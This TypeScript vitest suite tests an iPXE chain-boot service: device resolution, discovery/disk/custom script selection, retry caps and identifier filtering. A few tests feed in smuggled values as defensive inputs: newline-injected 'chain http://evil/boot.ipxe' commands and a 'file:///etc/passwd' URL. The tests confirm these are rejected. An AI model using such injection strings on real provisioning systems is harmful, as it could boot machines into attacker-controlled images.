import { beforeEach, describe, expect, it } from 'vitest';

import { resetApplicationConfigForTests } from '../../core/application.config';
import { deviceRecordSchema, type DeviceRecord } from '../../device-record/device-record.schema';
import { ResolveOutcome, type ResolveResult } from '../../device-record/device-record.service';
import { resetDiscoveryFileConfig } from '../../download/discovery.config';

import { MAX_KNOWN_RECORD_MISSING_RETRIES } from '../chain-decision';
import { extractIdentifiers } from '../chain.helpers';
import { CHAIN_RESOLVE_TIMEOUT_S, ChainService, IPXE_RENDERER } from '../chain.service';
import { NIL_DEVICE_ID, type RendererCall, type RendererSpy } from '../chain.types';
import { IpxeServerTokenUnavailableError, IpxeServiceError } from '../ipxe-errors';
import type { RenderRequest } from '../ipxe-renderer.helpers';

const DEVICE_UUID = '12121212-1212-1212-1212-121212121212';
const PLACEHOLDER_UUID = '34343434-3434-3434-3434-343434343434';

function record(overrides: Partial<DeviceRecord> = {}): DeviceRecord {
  return deviceRecordSchema.parse({
    id: DEVICE_UUID,
    status: 'provisioning',
    role: 'server',
    installed_os: null,
    rescue_os: null,
    platform_tags: [],
    device_type: 'poweredge-r750',
    netplan: null,
    serial_port_recommended: null,
    last_job_id: null,
    buildarch: 'amd64',
    ...overrides,
  });
}

interface ServiceUnderTest {
  chain: ChainService;
  spy: RendererSpy;
  events: RendererCall[];
  deviceRecord: { resolveDevice: ReturnType<typeof recordingResolveDevice> };
}

function recordingResolveDevice() {
  const calls: Array<{
    identifiers: Record<string, string>;
    buildarch: string | null;
    jobId: string;
    renderFacts: Record<string, string> | null;
    timeoutS: number | undefined;
  }> = [];
  let nextResult: ResolveResult | null = null;
  const fn = async (
    identifiers: Readonly<Record<string, string>>,
    options: {
      buildarch?: string | null;
      jobId?: string;
      timeoutS?: number;
      renderFacts?: Record<string, string> | null;
    },
  ): Promise<ResolveResult> => {
    calls.push({
      identifiers: { ...identifiers },
      buildarch: options.buildarch ?? null,
      jobId: options.jobId ?? '',
      renderFacts: options.renderFacts ?? null,
      timeoutS: options.timeoutS,
    });
    if (nextResult === null) {
      throw new Error('resolveDevice stub: no result configured');
    }
    return nextResult;
  };
  return Object.assign(fn, {
    calls,
    setResult(result: ResolveResult): void {
      nextResult = result;
    },
  });
}

function makeService(): ServiceUnderTest {
  const events: RendererCall[] = [];
  const spy: RendererSpy = {
    render_discovery: async (kwargs) => {
      events.push({ method: 'render_discovery', kwargs });
      return 'discovery script';
    },
    render_disk: async (kwargs) => {
      events.push({ method: 'render_disk', kwargs });
      return 'disk script';
    },
    render_unknown: async (kwargs) => {
      events.push({ method: 'render_unknown', kwargs });
      return 'unknown script';
    },
    render_retry: async (kwargs) => {
      events.push({ method: 'render_retry', kwargs: kwargs ?? {} });
      return 'retry script';
    },
    render_custom: async (kwargs) => {
      events.push({ method: 'render_custom', kwargs });
      return 'custom script';
    },
  };
  const deviceRecord = { resolveDevice: recordingResolveDevice() };
  const chain = new ChainService(deviceRecord as never, spy, undefined, undefined, undefined, undefined);
  return { chain, spy, events, deviceRecord };
}

function request(buildarch: string, mac = 'aa:bb:cc:dd:ee:ff', platform = 'efi-amd64'): RenderRequest {
  return { platform, buildarch, mac_address: mac };
}

async function discoveryFlavorFor(configured: string, rec: ResolveResult): Promise<unknown> {
  const prior = process.env.DISCOVERY_FLAVORS;
  process.env.DISCOVERY_FLAVORS = configured;
  resetDiscoveryFileConfig();
  try {
    const { chain, events } = makeService();
    await chain.renderForRecord(rec, request('x86_64'), 'test-job-123', true);
    return events.find((e) => e.method === 'render_discovery')?.kwargs.flavor;
  } finally {
    if (prior === undefined) delete process.env.DISCOVERY_FLAVORS;
    else process.env.DISCOVERY_FLAVORS = prior;
    resetDiscoveryFileConfig();
  }
}

const untagged = (): DeviceRecord => record({ installed_os: null, platform_tags: [] });
const lightTagged = (): DeviceRecord => record({ installed_os: null, platform_tags: ['discovery-light'] });

void IPXE_RENDERER;

describe('iPXERequest.validate', () => {
  it.each(['amd64', 'arm64', 'x86_64', 'aarch64'])('accepts supported arch %s', (arch) => {
    const { chain } = makeService();
    expect(() => chain.validateRequest(request(arch))).not.toThrow();
  });

  it('rejects unsupported arch', () => {
    const { chain } = makeService();
    expect(() => chain.validateRequest(request('ppc64le'))).toThrow(IpxeServiceError);
    try {
      chain.validateRequest(request('ppc64le'));
    } catch (e) {
      expect((e as Error).message).toContain('Unsupported architecture: ppc64le');
    }
  });
});

describe('extractIdentifiers', () => {
  it('picks only non-empty fields', () => {
    const body = {
      mac: 'aa:bb:cc:dd:ee:ff',
      ipmi_mac: '',
      system_uuid: '',
      serial: 'ABC123',
      chassis_serial: '',
      board_serial: '',
    };
    expect(extractIdentifiers(body)).toEqual({ mac: 'aa:bb:cc:dd:ee:ff', serial: 'ABC123' });
  });

  it('empty body returns empty dict', () => {
    const body = { mac: '', ipmi_mac: '', system_uuid: '', serial: '', chassis_serial: '', board_serial: '' };
    expect(extractIdentifiers(body)).toEqual({});
  });
});

describe('ChainService.renderForRecord', () => {
  it('unsupported arch renders unknown', async () => {
    const { chain, events } = makeService();
    const result = await chain.renderForRecord(record(), request('ppc64le'), 'test-job-123');
    expect(result).toBe('unknown script');
    expect(events).toHaveLength(1);
    expect(events[0]?.method).toBe('render_unknown');
  });

  it('unknown outcome without a confirmed pending write re-chains via bounded retry', async () => {
    const { chain, events } = makeService();
    const result = await chain.renderForRecord(ResolveOutcome.UNKNOWN, request('x86_64'), 'test-job-123');
    expect(result).toBe('retry script');
    expect(events.map((e) => e.method)).toEqual(['render_retry']);
    expect((events[0]?.kwargs as Record<string, unknown>).retry_count).toBe(1);
    expect(events.find((e) => e.method === 'render_discovery')).toBeUndefined();
  });

  it('unknown + unconfirmed pending falls back to NIL discovery after the retry cap', async () => {
    const { chain, events } = makeService();
    const req: RenderRequest = { ...request('x86_64'), retry_count: MAX_KNOWN_RECORD_MISSING_RETRIES };
    const result = await chain.renderForRecord(ResolveOutcome.UNKNOWN, req, 'test-job-123');
    expect(result).toBe('discovery script');
    expect(events.map((e) => e.method)).toEqual(['render_discovery']);
    const kwargs = events[0]?.kwargs as Record<string, unknown>;
    expect(kwargs.device_id).toBe(NIL_DEVICE_ID);
    expect(kwargs.is_placeholder_device).toBe(false);
    expect(kwargs.mac).toBeUndefined();
  });

  it('unknown outcome with a confirmed pending write boots the per-MAC discovery initrd', async () => {
    const { chain, events } = makeService();
    const result = await chain.renderForRecord(ResolveOutcome.UNKNOWN, request('x86_64'), 'test-job-123', true);
    expect(result).toBe('discovery script');
    const kwargs = events[0]?.kwargs as Record<string, unknown>;
    expect(kwargs.device_id).toBe(NIL_DEVICE_ID);
    expect(kwargs.is_placeholder_device).toBe(true);
    expect(kwargs.mac).toBe('aa:bb:cc:dd:ee:ff');
  });

  it('empty-MAC confirmed pending renders the NIL give-up, never a per-MAC placeholder promise', async () => {
    const { chain, events } = makeService();
    const req: RenderRequest = { ...request('x86_64'), mac_address: '' };
    const result = await chain.renderForRecord(ResolveOutcome.UNKNOWN, req, 'test-job-123', true);
    expect(result).toBe('discovery script');
    const kwargs = events[0]?.kwargs as Record<string, unknown>;
    expect(kwargs.device_id).toBe(NIL_DEVICE_ID);
    expect(kwargs.is_placeholder_device).toBe(false);
    expect(kwargs.mac).toBeUndefined();
  });

  it('KNOWN_RECORD_MISSING renders retry not discovery', async () => {
    const { chain, events } = makeService();
    const result = await chain.renderForRecord(ResolveOutcome.KNOWN_RECORD_MISSING, request('x86_64'), 'test-job-123');
    expect(result).toBe('retry script');
    expect(events.map((e) => e.method)).toEqual(['render_retry']);
    expect((events[0]?.kwargs as Record<string, unknown>).retry_count).toBe(1);
  });

  it('KNOWN_RECORD_MISSING increments retry_count on each re-chain', async () => {
    const { chain, events } = makeService();
    const req: RenderRequest = { ...request('x86_64'), retry_count: 3 };
    await chain.renderForRecord(ResolveOutcome.KNOWN_RECORD_MISSING, req, 'test-job-123');
    expect((events[0]?.kwargs as Record<string, unknown>).retry_count).toBe(4);
  });

  it('KNOWN_RECORD_MISSING falls back to discovery after the retry cap', async () => {
    const { chain, events } = makeService();
    const req: RenderRequest = { ...request('x86_64'), retry_count: MAX_KNOWN_RECORD_MISSING_RETRIES };
    const result = await chain.renderForRecord(ResolveOutcome.KNOWN_RECORD_MISSING, req, 'test-job-123');
    expect(result).toBe('discovery script');
    expect(events.map((e) => e.method)).toEqual(['render_discovery']);
    expect(events.find((e) => e.method === 'render_retry')).toBeUndefined();
    expect((events[0]?.kwargs as Record<string, unknown>).is_placeholder_device).toBe(false);
    expect((events[0]?.kwargs as Record<string, unknown>).device_id).toBe(NIL_DEVICE_ID);
  });

  it('rescue_os routes to discovery', async () => {
    const { chain, events } = makeService();
    const rec = record({ rescue_os: 'brokkr-discovery' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');
    expect(result).toBe('discovery script');
    const kwargs = events[0]?.kwargs as Record<string, unknown>;
    expect(kwargs.arch).toBe('amd64');
    expect(kwargs.platform_type).toBe('inventory');
    expect(kwargs.pci_realloc_off).toBe(false);
  });

  it('installed_os non-discovery routes to disk', async () => {
    const { chain, events } = makeService();
    const rec = record({ installed_os: 'ubuntu-20.04' });
    const result = await chain.renderForRecord(rec, request('x86_64', 'aa:bb:cc:dd:ee:ff', 'efi'), 'test-job-123');
    expect(result).toBe('disk script');
    expect(events).toHaveLength(1);
    expect(events[0]?.method).toBe('render_disk');
    expect(events[0]?.kwargs).toEqual({
      platform: 'efi',
      arch: 'amd64',
      job_id: 'test-job-123',
      grub_supported: true,
    });
  });

  it('unsupported arch:platform (arm64:pcbios) skips the grub chain', async () => {
    const { chain, events } = makeService();
    const rec = record({ installed_os: 'ubuntu-22.04' });
    await chain.renderForRecord(rec, request('aarch64', 'aa:bb:cc:dd:ee:ff', 'pcbios'), 'test-job-123');
    expect(events[0]?.method).toBe('render_disk');
    expect((events[0]?.kwargs as Record<string, unknown>).grub_supported).toBe(false);
  });

  it('arm64 buildarch passes arm64 arch to renderer', async () => {
    const { chain, events } = makeService();
    const rec = record({ installed_os: 'ubuntu-22.04' });
    await chain.renderForRecord(rec, request('aarch64', 'aa:bb:cc:dd:ee:ff', 'efi-aarch64'), 'test-job-123');
    expect((events[0]?.kwargs as Record<string, unknown>).arch).toBe('arm64');
  });

  it('no installed_os triggers inventory and boots discovery', async () => {
    const events: RendererCall[] = [];
    const spy: RendererSpy = {
      render_discovery: async (kwargs) => {
        events.push({ method: 'render_discovery', kwargs });
        return 'discovery script';
      },
      render_disk: async () => 'disk script',
      render_unknown: async () => 'unknown script',
      render_retry: async () => 'retry script',
      render_custom: async () => 'custom script',
    };
    let triggerCalls = 0;
    const chain = new ChainService(
      { resolveDevice: async () => ResolveOutcome.UNKNOWN } as never,
      spy,
      undefined,
      undefined,
      async () => {
        triggerCalls++;
      },
      undefined,
    );
    const rec = record({ installed_os: null });
    expect(await chain.renderForRecord(rec, request('x86_64'), 'test-job-123')).toBe('discovery script');
    expect(triggerCalls).toBe(1);
  });

  it('still boots discovery and warns when the inventory trigger rejects', async () => {
    const events: RendererCall[] = [];
    const spy: RendererSpy = {
      render_discovery: async (kwargs) => {
        events.push({ method: 'render_discovery', kwargs });
        return 'discovery script';
      },
      render_disk: async () => 'disk script',
      render_unknown: async () => 'unknown script',
      render_retry: async () => 'retry script',
      render_custom: async () => 'custom script',
    };
    const warnCalls: string[] = [];
    const logger = {
      warn: async (message: string) => {
        warnCalls.push(message);
      },
    };
    const chain = new ChainService(
      { resolveDevice: async () => ResolveOutcome.UNKNOWN } as never,
      spy,
      undefined,
      undefined,
      async () => {
        throw new Error('redis down');
      },
      logger,
    );
    const rec = record({ installed_os: null });
    expect(await chain.renderForRecord(rec, request('x86_64'), 'test-job-123')).toBe('discovery script');
    expect(warnCalls.some((m) => m.includes('inventory_collection'))).toBe(true);
  });

  it('discovery-slug installed_os skips inventory', async () => {
    let triggerCalls = 0;
    const events: RendererCall[] = [];
    const spy: RendererSpy = {
      render_discovery: async (kwargs) => {
        events.push({ method: 'render_discovery', kwargs });
        return 'discovery script';
      },
      render_disk: async () => 'disk script',
      render_unknown: async () => 'unknown script',
      render_retry: async () => 'retry script',
      render_custom: async () => 'custom script',
    };
    const chain = new ChainService(
      { resolveDevice: async () => ResolveOutcome.UNKNOWN } as never,
      spy,
      undefined,
      undefined,
      async () => {
        triggerCalls++;
      },
      undefined,
    );
    const rec = record({ installed_os: 'ubuntu-rescue-os' });
    expect(await chain.renderForRecord(rec, request('x86_64'), 'test-job-123')).toBe('discovery script');
    expect(triggerCalls).toBe(0);
  });

  it('status is ignored — installed_os boots disk', async () => {
    const { chain } = makeService();
    const rec = record({ status: 'archived', installed_os: 'ubuntu-22.04' });
    expect(await chain.renderForRecord(rec, request('x86_64'), 'test-job-123')).toBe('disk script');
  });

  it('pci_realloc_off set for xe9780', async () => {
    const { chain, events } = makeService();
    const rec = record({ rescue_os: 'brokkr-discovery', device_type: 'poweredge-xe9780' });
    await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');
    expect((events[0]?.kwargs as Record<string, unknown>).pci_realloc_off).toBe(true);
  });

  it('rescue platform tag passes rescue platform_type', async () => {
    const { chain, events } = makeService();
    const rec = record({ rescue_os: 'brokkr-discovery', platform_tags: ['rescue'] });
    await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');
    expect((events[0]?.kwargs as Record<string, unknown>).platform_type).toBe('rescue');
  });

  it('serves the only configured flavor to every device', async () => {
    expect(await discoveryFlavorFor('light', untagged())).toBe('light');
    expect(await discoveryFlavorFor('light', lightTagged())).toBe('light');
    expect(await discoveryFlavorFor('light', ResolveOutcome.UNKNOWN)).toBe('light');
    expect(await discoveryFlavorFor('full', lightTagged())).toBe('full');
  });

  it('serves light to a device tagged discovery-light when both flavors are configured', async () => {
    expect(await discoveryFlavorFor('light,full', lightTagged())).toBe('light');
  });

  it('serves full to an untagged device when both flavors are configured', async () => {
    expect(await discoveryFlavorFor('light,full', untagged())).toBe('full');
    expect(await discoveryFlavorFor('light,full', ResolveOutcome.UNKNOWN)).toBe('full');
  });

  it('placeholder on custom slug renders discovery', async () => {
    const { chain, events } = makeService();
    const rec = record({ id: PLACEHOLDER_UUID, is_placeholder: true, installed_os: 'ipxe-custom' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');
    expect(result).toBe('discovery script');
    expect((events[0]?.kwargs as Record<string, unknown>).is_placeholder_device).toBe(true);
  });

  it('placeholder always boots discovery', async () => {
    const { chain, events } = makeService();
    const rec = record({ id: PLACEHOLDER_UUID, is_placeholder: true, installed_os: 'ubuntu-22.04' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');
    expect(result).toBe('discovery script');
    expect(events.find((e) => e.method === 'render_disk')).toBeUndefined();
  });
});

describe('ChainService.renderForRecord — custom iPXE', () => {
  function makeWithRedis(value: string | null): {
    chain: ChainService;
    events: RendererCall[];
    redisCalls: Array<{ deviceId: string; jobId: string }>;
  } {
    const events: RendererCall[] = [];
    const redisCalls: Array<{ deviceId: string; jobId: string }> = [];
    const spy: RendererSpy = {
      render_discovery: async (kwargs) => {
        events.push({ method: 'render_discovery', kwargs });
        return 'discovery script';
      },
      render_disk: async (kwargs) => {
        events.push({ method: 'render_disk', kwargs });
        return 'disk script';
      },
      render_unknown: async () => 'unknown script',
      render_retry: async () => 'retry script',
      render_custom: async (kwargs) => {
        events.push({ method: 'render_custom', kwargs });
        return 'custom script';
      },
    };
    const chain = new ChainService(
      { resolveDevice: async () => ResolveOutcome.UNKNOWN } as never,
      spy,
      async (deviceId, jobId) => {
        redisCalls.push({ deviceId, jobId });
        return value;
      },
      undefined,
      undefined,
      undefined,
    );
    return { chain, events, redisCalls };
  }

  function makeWithTokenUnavailable(value: string | null = 'https://customer.example/boot.ipxe'): {
    chain: ChainService;
    events: RendererCall[];
  } {
    const events: RendererCall[] = [];
    const spy: RendererSpy = {
      render_discovery: async () => 'discovery script',
      render_disk: async () => 'disk script',
      render_unknown: async () => 'unknown script',
      render_retry: async (kwargs) => {
        events.push({ method: 'render_retry', kwargs: kwargs ?? {} });
        return 'retry script';
      },
      render_custom: async (kwargs) => {
        events.push({ method: 'render_custom', kwargs });
        throw new IpxeServerTokenUnavailableError('server_token atom unavailable for device');
      },
    };
    const chain = new ChainService(
      { resolveDevice: async () => ResolveOutcome.UNKNOWN } as never,
      spy,
      async () => value,
      undefined,
      undefined,
      undefined,
    );
    return { chain, events };
  }

  it('null server_token re-chains via bounded retry instead of a 400', async () => {
    const { chain, events } = makeWithTokenUnavailable();
    const rec = record({ id: DEVICE_UUID, status: 'provisioning', installed_os: 'ipxe-custom' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');
    expect(result).toBe('retry script');
    expect(events.map((e) => e.method)).toEqual(['render_custom', 'render_retry']);
    const retryCall = events.find((e) => e.method === 'render_retry');
    expect((retryCall?.kwargs as Record<string, unknown>).retry_count).toBe(1);
  });

  it('null server_token surfaces the error after the retry cap', async () => {
    const { chain, events } = makeWithTokenUnavailable();
    const rec = record({ id: DEVICE_UUID, status: 'provisioning', installed_os: 'ipxe-custom' });
    const req: RenderRequest = { ...request('x86_64'), retry_count: MAX_KNOWN_RECORD_MISSING_RETRIES };
    await expect(chain.renderForRecord(rec, req, 'test-job-123')).rejects.toBeInstanceOf(
      IpxeServerTokenUnavailableError,
    );
    expect(events.find((e) => e.method === 'render_retry')).toBeUndefined();
  });

  it('poisoned hub field (IpxeServiceError from render_custom) degrades to normal boot, not a 400', async () => {
    const events: RendererCall[] = [];
    const spy: RendererSpy = {
      render_discovery: async () => 'discovery script',
      render_disk: async (kwargs) => {
        events.push({ method: 'render_disk', kwargs });
        return 'disk script';
      },
      render_unknown: async () => 'unknown script',
      render_retry: async () => 'retry script',
      render_custom: async (kwargs) => {
        events.push({ method: 'render_custom', kwargs });
        throw new IpxeServiceError('custom iPXE brokkr_live_token contains control characters');
      },
    };
    const chain = new ChainService(
      { resolveDevice: async () => ResolveOutcome.UNKNOWN } as never,
      spy,
      async () => 'https://customer.example/boot.ipxe',
      undefined,
      undefined,
      undefined,
    );
    const rec = record({ id: DEVICE_UUID, status: 'provisioning', installed_os: 'ipxe-custom' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');
    expect(result).toBe('disk script');
    expect(events.map((e) => e.method)).toEqual(['render_custom', 'render_disk']);
  });

  it.each(['ipxe-custom', 'ipxe-custom-tee'])('present Redis key renders custom for %s', async (installed) => {
    const { chain, events, redisCalls } = makeWithRedis('https://customer.example/boot.ipxe');
    const rec = record({ id: DEVICE_UUID, status: 'provisioning', installed_os: installed });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');

    expect(result).toBe('custom script');
    expect(redisCalls).toEqual([{ deviceId: DEVICE_UUID, jobId: 'test-job-123' }]);
    const customCall = events.find((e) => e.method === 'render_custom');
    expect(customCall?.kwargs).toEqual({
      ipxe_url: 'https://customer.example/boot.ipxe',
      device_id: DEVICE_UUID,
      job_id: 'test-job-123',
    });
    expect(events.find((e) => e.method === 'render_discovery')).toBeUndefined();
    expect(events.find((e) => e.method === 'render_disk')).toBeUndefined();
  });

  it('sanitizes a control-char last_job_id fallback before it reaches the iPXE template', async () => {
    const { chain, events } = makeWithRedis('https://customer.example/boot.ipxe');
    const rec = record({
      id: DEVICE_UUID,
      status: 'provisioning',
      installed_os: 'ipxe-custom',
      last_job_id: 'job\nchain http://evil/boot.ipxe',
    });
    await chain.renderForRecord(rec, request('x86_64'), '');

    const customCall = events.find((e) => e.method === 'render_custom');
    expect(customCall?.kwargs.job_id).toBe('');
  });

  it('absent Redis key falls through to normal boot path', async () => {
    const { chain, events, redisCalls } = makeWithRedis(null);
    const rec = record({ id: DEVICE_UUID, status: 'provisioning', installed_os: 'ipxe-custom' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');

    expect(redisCalls).toEqual([{ deviceId: DEVICE_UUID, jobId: 'test-job-123' }]);
    expect(events.find((e) => e.method === 'render_custom')).toBeUndefined();
    expect(result).toBe('disk script');
  });

  it('empty-string Redis key falls through', async () => {
    const { chain, events } = makeWithRedis('');
    const rec = record({ id: DEVICE_UUID, status: 'provisioning', installed_os: 'ipxe-custom-tee' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');

    expect(events.find((e) => e.method === 'render_custom')).toBeUndefined();
    expect(result).toBe('disk script');
  });

  it('non-provisioning status does not read Redis', async () => {
    const { chain, events, redisCalls } = makeWithRedis('https://customer.example/boot.ipxe');
    const rec = record({ id: DEVICE_UUID, status: 'provisioned', installed_os: 'ipxe-custom' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');

    expect(redisCalls).toEqual([]);
    expect(events.find((e) => e.method === 'render_custom')).toBeUndefined();
    expect(result).toBe('disk script');
  });

  it('degrades to the normal boot path when the Redis lookup throws, not a 500', async () => {
    const events: RendererCall[] = [];
    const spy: RendererSpy = {
      render_discovery: async () => 'discovery script',
      render_disk: async (kwargs) => {
        events.push({ method: 'render_disk', kwargs });
        return 'disk script';
      },
      render_unknown: async () => 'unknown script',
      render_retry: async () => 'retry script',
      render_custom: async (kwargs) => {
        events.push({ method: 'render_custom', kwargs });
        return 'custom script';
      },
    };
    const chain = new ChainService(
      { resolveDevice: async () => ResolveOutcome.UNKNOWN } as never,
      spy,
      async () => {
        throw new Error('redis down');
      },
      undefined,
      undefined,
      undefined,
    );
    const rec = record({ id: DEVICE_UUID, status: 'provisioning', installed_os: 'ipxe-custom' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');
    expect(result).toBe('disk script');
    expect(events.find((e) => e.method === 'render_custom')).toBeUndefined();
  });

  it.each([
    ['newline injection', 'http://ok/x\nchain http://evil/boot.ipxe'],
    ['non-http scheme', 'file:///etc/passwd'],
    ['not a URL', 'just-a-string'],
  ])('unsafe Redis ipxe_url (%s) is rejected before render and falls through', async (_label, value) => {
    const { chain, events } = makeWithRedis(value);
    const rec = record({ id: DEVICE_UUID, status: 'provisioning', installed_os: 'ipxe-custom' });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');

    expect(events.find((e) => e.method === 'render_custom')).toBeUndefined();
    expect(result).toBe('disk script');
  });

  it('placeholder + custom + provisioning ignores Redis and boots discovery', async () => {
    const { chain, events, redisCalls } = makeWithRedis('https://customer.example/boot.ipxe');
    const rec = record({
      id: PLACEHOLDER_UUID,
      is_placeholder: true,
      status: 'provisioning',
      installed_os: 'ipxe-custom',
    });
    const result = await chain.renderForRecord(rec, request('x86_64'), 'test-job-123');

    expect(redisCalls).toEqual([]);
    expect(events.find((e) => e.method === 'render_custom')).toBeUndefined();
    expect(result).toBe('discovery script');
  });
});

describe('ChainService.resolveRecord', () => {
  let svc: ServiceUnderTest;
  beforeEach(() => {
    svc = makeService();
  });

  it('returns UNKNOWN when identifiers empty', async () => {
    const result = await svc.chain.resolveRecord({}, 'amd64', 'test-job-123');
    expect(result).toBe(ResolveOutcome.UNKNOWN);
    expect(svc.deviceRecord.resolveDevice.calls).toEqual([]);
  });

  it('passes through to deviceRecord.resolveDevice', async () => {
    const rec = record();
    svc.deviceRecord.resolveDevice.setResult(rec);
    const result = await svc.chain.resolveRecord({ mac: '0c:c4:7a:dd:ee:ff', serial: 'X1' }, 'amd64', 'test-job-123');
    expect(result).toBe(rec);
    expect(svc.deviceRecord.resolveDevice.calls).toHaveLength(1);
    const call = svc.deviceRecord.resolveDevice.calls[0];
    expect(call?.identifiers).toEqual({ mac: '0c:c4:7a:dd:ee:ff', serial: 'X1' });
    expect(call?.buildarch).toBe('amd64');
    expect(call?.jobId).toBe('test-job-123');
    expect(call?.renderFacts).toBeNull();
  });

  it('forwards render facts to deviceRecord.resolveDevice', async () => {
    const rec = record();
    svc.deviceRecord.resolveDevice.setResult(rec);
    const facts = { ip: '10.0.0.5', ipmi_ip: '10.0.0.9', manufacturer: 'Dell' };
    await svc.chain.resolveRecord({ mac: '0c:c4:7a:dd:ee:ff' }, 'amd64', 'test-job-123', facts);
    expect(svc.deviceRecord.resolveDevice.calls[0]?.renderFacts).toEqual(facts);
  });

  it('strips locally-administered MAC before resolving', async () => {
    const rec = record();
    svc.deviceRecord.resolveDevice.setResult(rec);
    const result = await svc.chain.resolveRecord(
      { mac: 'be:3a:f2:b6:05:9f', ipmi_mac: '7c:c2:55:92:02:9c', serial: 'X1' },
      'amd64',
      'test-job-123',
    );
    expect(result).toBe(rec);
    expect(svc.deviceRecord.resolveDevice.calls).toHaveLength(1);
    expect(svc.deviceRecord.resolveDevice.calls[0]?.identifiers).toEqual({
      ipmi_mac: '7c:c2:55:92:02:9c',
      serial: 'X1',
    });
  });

  it('returns UNKNOWN when only a locally-administered MAC remains', async () => {
    const result = await svc.chain.resolveRecord({ mac: 'be:3a:f2:b6:05:9f' }, 'amd64', 'test-job-123');
    expect(result).toBe(ResolveOutcome.UNKNOWN);
    expect(svc.deviceRecord.resolveDevice.calls).toEqual([]);
  });

  it('strips bios placeholder identifiers before resolving', async () => {
    const rec = record();
    svc.deviceRecord.resolveDevice.setResult(rec);
    const result = await svc.chain.resolveRecord(
      {
        mac: '0c:c4:7a:dd:ee:ff',
        serial: 'To Be Filled By O.E.M.',
        chassis_serial: 'Default string',
        board_serial: '01234567890123456789AB',
      },
      'amd64',
      'test-job-123',
    );
    expect(result).toBe(rec);
    expect(svc.deviceRecord.resolveDevice.calls).toHaveLength(1);
    expect(svc.deviceRecord.resolveDevice.calls[0]?.identifiers).toEqual({ mac: '0c:c4:7a:dd:ee:ff' });
  });

  it('returns UNKNOWN when only placeholder identifiers remain', async () => {
    const result = await svc.chain.resolveRecord({ serial: 'To Be Filled By O.E.M.' }, 'amd64', 'test-job-123');
    expect(result).toBe(ResolveOutcome.UNKNOWN);
    expect(svc.deviceRecord.resolveDevice.calls).toEqual([]);
  });

  it('keeps locally-administered MACs under simulation (qemu 52:54:00 is the sim node identity)', async () => {
    const prior = process.env.LOCAL_SIMULATION_ENABLED;
    process.env.LOCAL_SIMULATION_ENABLED = 'true';
    resetApplicationConfigForTests();
    try {
      const rec = record();
      svc.deviceRecord.resolveDevice.setResult(rec);
      const result = await svc.chain.resolveRecord({ mac: '52:54:00:da:00:01' }, 'amd64', 'test-job-123');
      expect(result).toBe(rec);
      expect(svc.deviceRecord.resolveDevice.calls[0]?.identifiers).toEqual({ mac: '52:54:00:da:00:01' });
    } finally {
      if (prior === undefined) delete process.env.LOCAL_SIMULATION_ENABLED;
      else process.env.LOCAL_SIMULATION_ENABLED = prior;
      resetApplicationConfigForTests();
    }
  });

  it('caps resolveDevice to the short chain budget so an unknown box falls through fast', async () => {
    svc.deviceRecord.resolveDevice.setResult(ResolveOutcome.UNKNOWN);
    await svc.chain.resolveRecord({ mac: '0c:c4:7a:dd:ee:ff' }, 'amd64', 'test-job-123');
    const call = svc.deviceRecord.resolveDevice.calls[0];
    expect(call?.timeoutS).toBe(CHAIN_RESOLVE_TIMEOUT_S);
    expect(CHAIN_RESOLVE_TIMEOUT_S).toBeLessThanOrEqual(3);
  });
});
